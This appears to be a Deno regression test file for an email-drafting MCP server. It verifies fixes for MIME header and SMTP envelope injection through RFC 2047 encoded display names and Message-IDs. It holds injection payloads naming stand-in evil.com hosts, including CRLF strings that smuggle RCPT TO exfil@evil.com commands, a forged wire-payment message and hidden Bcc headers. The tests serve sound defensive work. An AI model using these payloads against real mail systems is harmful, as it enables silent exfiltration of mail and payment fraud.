// ---------------------------------------------------------------------------
// mime-injection.test.ts — RFC 2047 double-decode, MIME header and SMTP
// envelope injection (findings F-03-01..04, 2026-10-16).
//
// The attack: an encoded display name (or Message-ID) that, decoded, holds
// commas, angle brackets or CRLF. Decoding the whole header and re-splitting
// it turned that into STRUCTURE: an extra recipient, a hidden Bcc after a
// draft rebuild, or SMTP commands in the user's authenticated session. These
// tests drive the real functions on each step of that chain, and pin the
// legitimate round trips (non-ASCII names, quoted commas, threading) that the
// fix must keep.
//
// Run: deno test --node-modules-dir=none --allow-read --allow-env --allow-run=git \
//        supabase/functions/mcp-server/mime-injection.test.ts
// ---------------------------------------------------------------------------

import { assert, assertEquals, assertFalse, assertRejects, assertThrows } from "jsr:@std/assert@1";
import {
  formatMailboxDisplay,
  parseAddressHeader,
  parseAddressList,
  parseMailbox,
  splitAddressList,
} from "./address-header.ts";
import { buildDraftMime, buildMimeMessage, headerAddressList } from "./mime-build.ts";
import { getHeader, parseEmail } from "./mime.ts";
import { assertEnvelopeSafe, sendViaSmtp, SmtpNotSentError } from "./smtp-client.ts";
import { invalidRecipientIn, rewriteRecipientHeaders } from "./draft-recipients.ts";

Deno.env.set("MCP_INTROSPECTION_ONLY", "1");
Deno.env.set("MCP_SERVER_NO_LISTEN", "1");
const { draftContentFromRaw, draftMimeFor, draftEnvelopeRecipients, formatAddressEntry } =
  await import("./index.ts");

// ── helpers ────────────────────────────────────────────────────────────────

function b64(text: string): string {
  return btoa(Array.from(new TextEncoder().encode(text), (b) => String.fromCharCode(b)).join(""));
}
function encodedWord(text: string): string {
  return `=?UTF-8?B?${b64(text)}?=`;
}

/** Header names of a message's header block, unfolded, lower-case, in order. */
function headerNames(mime: string): string[] {
  const block = mime.split(/\r?\n\r?\n/)[0];
  return block.split(/\r?\n/).filter((l) => !/^[ \t]/.test(l)).map((l) =>
    l.slice(0, l.indexOf(":")).toLowerCase()
  );
}

function headerLines(mime: string): string[] {
  return mime.split(/\r?\n\r?\n/)[0].split(/\r?\n/);
}

/** Every header name buildMimeMessage may legitimately write. */
const ALLOWED_HEADERS = new Set([
  "from", "to", "cc", "bcc", "subject", "date", "message-id", "reply-to",
  "in-reply-to", "references", "mime-version", "content-type", "content-transfer-encoding",
]);

function assertNoInjectedHeaders(mime: string): void {
  for (const name of headerNames(mime)) {
    assert(ALLOWED_HEADERS.has(name), `unexpected header "${name}" in:\n${mime.split(/\r?\n\r?\n/)[0]}`);
  }
  // deno-lint-ignore no-control-regex
  for (const line of headerLines(mime)) assertFalse(/[\x00-\x08\x0A-\x1F\x7F]/.test(line), line);
}

/** What draft_reply does on IMAP: read the original's From raw, write a draft to it. */
function replyDraftTo(rawFrom: string): string {
  const to = parseAddressHeader(rawFrom).map(formatAddressEntry);
  return draftMimeFor("Me <me@corp.example>", {
    to,
    cc: [],
    bcc: [],
    subject: "Re: hello",
    body: "reply",
  }, "draft-1");
}

/** The fields draft_update carries from a stored draft into its rebuild. */
function rebuildParams(content: ReturnType<typeof draftContentFromRaw>) {
  return {
    to: content.to,
    cc: content.cc,
    bcc: content.bcc,
    subject: content.subject,
    body: "edited",
    inReplyTo: content.inReplyTo,
    references: content.references,
    replyTo: content.replyTo,
  };
}

/** What imapSendDraft derives from a stored draft before SMTP. */
function envelopeOf(storedRaw: string): string[] {
  return draftEnvelopeRecipients(parseEmail(storedRaw).headers);
}

// ── exploit #10: double-encoded From carrying CRLF + SMTP verbs ─────────────

const SMTP_PAYLOAD = "x <a@evil.com\r\nRCPT TO:<exfil@evil.com>\r\nDATA\r\nFrom: victim@corp.com\r\n" +
  "To: cfo@corp.com\r\nSubject: wire\r\n\r\nPlease pay...\r\n.\r\nRSET\r\nMAIL FROM:<victim@corp.com";

Deno.test("#10 a double-encoded From with CRLF never reaches the SMTP envelope", () => {
  const rawFrom = `${encodedWord(encodedWord(SMTP_PAYLOAD))} <attacker@evil.com>`;
  const stored = replyDraftTo(rawFrom);
  assertNoInjectedHeaders(stored);
  // The envelope is the visible sender's address and nothing else.
  assertEquals(envelopeOf(stored), ["attacker@evil.com"]);
  // And a single-encoded variant (decoded once at read) is just as inert.
  const once = replyDraftTo(`${encodedWord(SMTP_PAYLOAD)} <attacker@evil.com>`);
  assertNoInjectedHeaders(once);
  assertEquals(envelopeOf(once), ["attacker@evil.com"]);
});

Deno.test("#10 a stored draft whose header decodes to CRLF is refused before SMTP", () => {
  // A draft another client (or the pre-fix builder) stored with the payload
  // already one decode away: the address is parsed raw, so the CRLF stays in
  // the NAME; an address that itself is broken is refused, not sent.
  const name = encodedWord(SMTP_PAYLOAD);
  const raw = `From: me@corp.example\r\nTo: ${name} <attacker@evil.com>\r\nSubject: x\r\n\r\nbody`;
  assertEquals(envelopeOf(raw), ["attacker@evil.com"]);
  const broken = `From: me@corp.example\r\nTo: <a@evil.com RCPT TO:x@evil.com>\r\nSubject: x\r\n\r\nbody`;
  const err = assertThrows(() => envelopeOf(broken));
  assertEquals((err as Error).message, "draft_has_invalid_recipient");
});

Deno.test("#10 the SMTP layer refuses an unsafe MAIL FROM / RCPT TO without connecting", async () => {
  for (const bad of ["a@evil.com\r\nRCPT TO:<x@evil.com", "a@evil.com>", "<a@evil.com", "a @evil.com", "a@evil.com\n", "", "a\x00@x.com"]) {
    const err = assertThrows(() => assertEnvelopeSafe({ from: "me@corp.example", recipients: [bad] }));
    assert(err instanceof SmtpNotSentError, String(err));
    assertFalse(err.retryable, "a malformed address must not be retried");
  }
  assertThrows(() => assertEnvelopeSafe({ from: "me@corp.example\r\nRSET", recipients: ["ok@x.com"] }), SmtpNotSentError);
  // Legitimate addresses pass.
  assertEnvelopeSafe({ from: "me@corp.example", recipients: ["a@x.com", "jane.doe+tag@sub.example.no"] });
  // sendViaSmtp refuses before any connection: this test has no --allow-net,
  // so reaching the socket would surface as a (retryable) NotCapable error.
  const err = await assertRejects(
    () => sendViaSmtp(
      { host: "smtp.example.com", port: 465, security: "tls", email: "me@corp.example", password: "x" },
      { from: "me@corp.example", recipients: ["a@evil.com\r\nRCPT TO:<x@evil.com>"], rawMessage: "x" },
    ),
    SmtpNotSentError,
  );
  assertFalse((err as SmtpNotSentError).retryable);
  assert((err as Error).message.includes("envelope refused"));
});

// ── exploit #12: nested encoded-word carrying "x@evil.com," ─────────────────

Deno.test("#12 an encoded comma in a display name never adds a recipient", () => {
  for (
    const rawFrom of [
      `${encodedWord("exfil@evil.com,")} <attacker@evil.com>`,
      `${encodedWord(encodedWord("exfil@evil.com,"))} <attacker@evil.com>`,
      `${encodedWord("exfil@evil.com, boss@victim-corp.com <boss@victim-corp.com>,")} <attacker@evil.com>`,
    ]
  ) {
    assertEquals(parseAddressHeader(rawFrom).map((a) => a.email), ["attacker@evil.com"], rawFrom);
    const stored = replyDraftTo(rawFrom);
    assertEquals(envelopeOf(stored), ["attacker@evil.com"], rawFrom);
    // Rebuilt on draft_update, it is still one recipient.
    const content = draftContentFromRaw(stored, undefined);
    assertEquals(content.to.length, 1);
    const rebuilt = draftMimeFor("Me <me@corp.example>", rebuildParams(content), "draft-2");
    assertEquals(envelopeOf(rebuilt), ["attacker@evil.com"], rawFrom);
  }
});

// ── exploit #11: encoded Message-ID that decodes to CRLF + Bcc ──────────────

Deno.test("#11 an encoded Message-ID does not become a Bcc header on draft_update", () => {
  const evilId = encodedWord("\r\nBcc: exfil@evil.com");
  // draft_reply copies the original's Message-ID raw into In-Reply-To.
  const first = draftMimeFor("Me <me@corp.example>", {
    to: ["Victim Colleague <colleague@corp.example>"],
    cc: [],
    bcc: [],
    subject: "Re: x",
    body: "reply",
    inReplyTo: evilId,
    references: `<a@b.example> ${evilId}`,
  }, "draft-1");
  assertNoInjectedHeaders(first);
  // draft_update: read the stored draft, rebuild it.
  const content = draftContentFromRaw(first, undefined);
  assertEquals(content.inReplyTo, evilId, "msg-id headers are carried raw, never decoded");
  const rebuilt = draftMimeFor("Me <me@corp.example>", rebuildParams(content), "draft-2");
  assertNoInjectedHeaders(rebuilt);
  assertEquals(getHeader(parseEmail(rebuilt).headers, "bcc"), null);
  assertEquals(envelopeOf(rebuilt), ["colleague@corp.example"]);
});

Deno.test("buildMimeMessage strips control characters from EVERY header value it writes", () => {
  const inj = "\r\nBcc: exfil@evil.com\r\nX-Evil: 1";
  const mime = buildMimeMessage({
    from: `Me${inj} <me@corp.example>`,
    to: [`Bob${inj} <bob@x.example>`, `bob2@x.example${inj}`],
    cc: [`Carol <carol@x.example>${inj}`],
    subject: `Hi${inj}`,
    textBody: "body",
    replyTo: `Reply${inj} <r@x.example>`,
    messageId: `id${inj}`,
    inReplyTo: `<orig@x.example>${inj}`,
    references: `<a@x.example>${inj}`,
  });
  assertNoInjectedHeaders(mime);
  assertEquals(getHeader(parseEmail(mime).headers, "bcc"), null);
  assertEquals(getHeader(parseEmail(mime).headers, "x-evil"), null);
  const h = parseEmail(mime).headers;
  // The legitimate content survives, inert.
  assertEquals(parseAddressHeader(getHeader(h, "to")).map((a) => a.email).slice(0, 1), ["bob@x.example"]);
  assertEquals(getHeader(h, "in-reply-to"), "<orig@x.example> Bcc: exfil@evil.com X-Evil: 1");
});

// ── hardening: draft_send recipient override ───────────────────────────────

Deno.test("draft_send override: a CRLF display name is refused, and overrides are re-serialized", () => {
  const valid = (a: string) => /^[^\s@<>]+@[^\s@<>]+\.[a-z]{2,}$/i.test(a);
  const bad = invalidRecipientIn({ to: ["x\r\nBcc: exfil@evil.com\r\nX: <ok@corp.com>"] }, valid);
  assertEquals(bad?.field, "to");
  assertEquals(invalidRecipientIn({ to: ["Åse Ødegård <ase@x.no>", '"Doe, Jane" <j@x.com>', "a@x.com"] }, valid), null);
  // Even if a caller skipped the check, the rewrite cannot inject.
  const raw = "From: me@corp.example\r\nTo: old@x.com\r\nSubject: s\r\n\r\nbody";
  const out = rewriteRecipientHeaders(raw, { to: ["x\r\nBcc: exfil@evil.com\r\nX: <ok@corp.com>", "Åse <ase@x.no>"] })!;
  assertNoInjectedHeaders(out);
  const to = parseAddressHeader(getHeader(parseEmail(out).headers, "to"));
  assertEquals(to.map((a) => a.email), ["ok@corp.com", "ase@x.no"]);
  assertEquals(to[1].name, "Åse");
});

// ── must not break: round trips ────────────────────────────────────────────

const NAMES = [
  "Åse Ødegård",
  "Bjørn Ærlig-Øvrebø",
  "山田 太郎",
  "김민준",
  "Zoë 🎉 Party",
  "محمد العلي",
  "דוד כהן",
  "Doe, Jane",
  'Bob "The Builder" O\'Neil',
  "J. R. R. Tolkien",
  "support@vendor.example",
];

Deno.test("non-ASCII and special display names round-trip through reply -> draft -> draft_read -> rebuild", () => {
  for (const name of NAMES) {
    // The original sender's From as a real mailer writes it.
    const rawFrom = headerAddressList([formatMailboxDisplay({ name, email: "sender@x.example" })])[0];
    assertEquals(parseAddressHeader(rawFrom), [{ name, email: "sender@x.example" }], rawFrom);
    const stored = replyDraftTo(rawFrom);
    assertNoInjectedHeaders(stored);
    // 7-bit on the wire.
    // deno-lint-ignore no-control-regex
    assert(/^[\x00-\x7F]*$/.test(stored.split(/\r?\n\r?\n/)[0]), "headers are ASCII");
    const content = draftContentFromRaw(stored, undefined);
    assertEquals(content.to.length, 1, name);
    assertEquals(parseMailbox(content.to[0]), { name, email: "sender@x.example" }, content.to[0]);
    assertEquals(envelopeOf(stored), ["sender@x.example"]);
    const rebuilt = draftMimeFor("Me <me@corp.example>", rebuildParams(content), "draft-2");
    assertEquals(draftContentFromRaw(rebuilt, undefined).to, content.to, name);
  }
});

Deno.test("names other mailers write: encoded, folded, quoted-encoded, Q-encoded, raw 8-bit, comments", () => {
  const cases: Array<[string, { name: string; email: string }[]]> = [
    ["=?UTF-8?B?w4VzZQ==?= =?UTF-8?B?IMOYZGVnw6VyZA==?= <ase@x.no>", [{ name: "Åse Ødegård", email: "ase@x.no" }]],
    ["=?ISO-8859-1?Q?Bj=F8rn_=C6rlig?= <b@x.no>", [{ name: "Bjørn Ærlig", email: "b@x.no" }]],
    ['"=?UTF-8?B?w4VzZQ==?=" <ase@x.no>', [{ name: "Åse", email: "ase@x.no" }]],
    ['"Doe, Jane" <j@x.com>, "Roe, Rich" <r@x.com>', [{ name: "Doe, Jane", email: "j@x.com" }, { name: "Roe, Rich", email: "r@x.com" }]],
    ["Åse Ødegård <ase@x.no>", [{ name: "Åse Ødegård", email: "ase@x.no" }]],
    ["a@x.com (Alice A)", [{ name: "Alice A", email: "a@x.com" }]],
    ["undisclosed-recipients:;", []],
    ["Team: a@x.com, Bob <b@x.com>;, c@x.com", [{ name: "", email: "a@x.com" }, { name: "Bob", email: "b@x.com" }, { name: "", email: "c@x.com" }]],
    ["plain@x.com", [{ name: "", email: "plain@x.com" }]],
    ["'Bob' <b@x.com>", [{ name: "Bob", email: "b@x.com" }]],
  ];
  for (const [raw, expected] of cases) assertEquals(parseAddressHeader(raw), expected, raw);
});

Deno.test("a quoted display name with a comma stays ONE recipient everywhere", () => {
  assertEquals(splitAddressList('"Doe, Jane" <j@x.com>').length, 1);
  assertEquals(parseAddressList('"Doe, Jane" <j@x.com>'), [{ name: "Doe, Jane", email: "j@x.com" }]);
  assertEquals(formatAddressEntry({ name: "Doe, Jane", email: "j@x.com" }), '"Doe, Jane" <j@x.com>');
  // An unquoted comma in a single entry (the old display form) is still one person.
  assertEquals(headerAddressList(["Doe, Jane <j@x.com>"]), ['"Doe, Jane" <j@x.com>']);
  // Two real mailboxes in one element stay two.
  assertEquals(headerAddressList(["a@x.com, Bob <b@x.com>"]), ["a@x.com", "Bob <b@x.com>"]);
  const mime = buildDraftMime({
    from: "Me <me@corp.example>",
    to: ['"Doe, Jane" <j@x.com>'],
    subject: "s",
    textBody: "b",
    messageId: "m",
  });
  assertEquals(envelopeOf(mime), ["j@x.com"]);
});

Deno.test("headerAddressList is idempotent on formatMailbox output and on its own output", () => {
  for (const name of NAMES) {
    const once = headerAddressList([formatMailboxDisplay({ name, email: "s@x.example" })]);
    assertEquals(headerAddressList(once), once, name);
  }
});

Deno.test("threading headers are written byte-for-byte when they are well-formed", () => {
  const inReplyTo = "<CAF=abc+def@mail.gmail.com>";
  const references = "<one@x.example> <two@y.example> <CAF=abc+def@mail.gmail.com>";
  const mime = draftMimeFor("Me <me@corp.example>", {
    to: ["a@x.com"], cc: [], bcc: [], subject: "Re: s", body: "b", inReplyTo, references,
  }, "draft-1");
  const h = parseEmail(mime).headers;
  assertEquals(getHeader(h, "in-reply-to"), inReplyTo);
  assertEquals(getHeader(h, "references"), references);
  const content = draftContentFromRaw(mime, undefined);
  assertEquals(content.inReplyTo, inReplyTo);
  assertEquals(content.references, references);
});

Deno.test("Bcc survives a stored IMAP draft and stays in the envelope", () => {
  const mime = draftMimeFor("Me <me@corp.example>", {
    to: ["Åse <a@x.no>"], cc: ["c@x.com"], bcc: ["Hidden Person <h@x.com>"], subject: "s", body: "b",
  }, "draft-1");
  assertEquals(envelopeOf(mime), ["a@x.no", "c@x.com", "h@x.com"]);
  assertEquals(draftContentFromRaw(mime, undefined).bcc, ["Hidden Person <h@x.com>"]);
});
